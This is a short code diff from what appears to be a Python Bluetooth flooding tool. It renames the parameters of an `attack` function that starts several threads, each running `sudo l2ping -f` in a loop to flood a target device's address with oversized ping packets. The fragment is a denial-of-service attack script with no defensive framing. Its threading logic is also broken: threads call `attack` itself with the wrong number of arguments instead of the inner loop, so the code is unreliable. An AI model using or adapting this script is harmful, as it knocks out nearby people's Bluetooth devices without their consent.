@@ -8,10 +8,10 @@ from threading import Thread
 
 abort_attack = False
 
-def attack(deviceAddress, bulltetSize):
+def attack(address, bulletSize, guns):
     def do_attack():
         while not abort_attack:
-            subprocess.run(["sudo", "l2ping", "-s", bulltetSize, "-f", deviceAddress])
+            subprocess.run(["sudo", "l2ping", "-s", bulletSize, "-f", address])
     for i in range(guns):
         Thread(target=attack, args=(address, bulletSize)).start()
     return
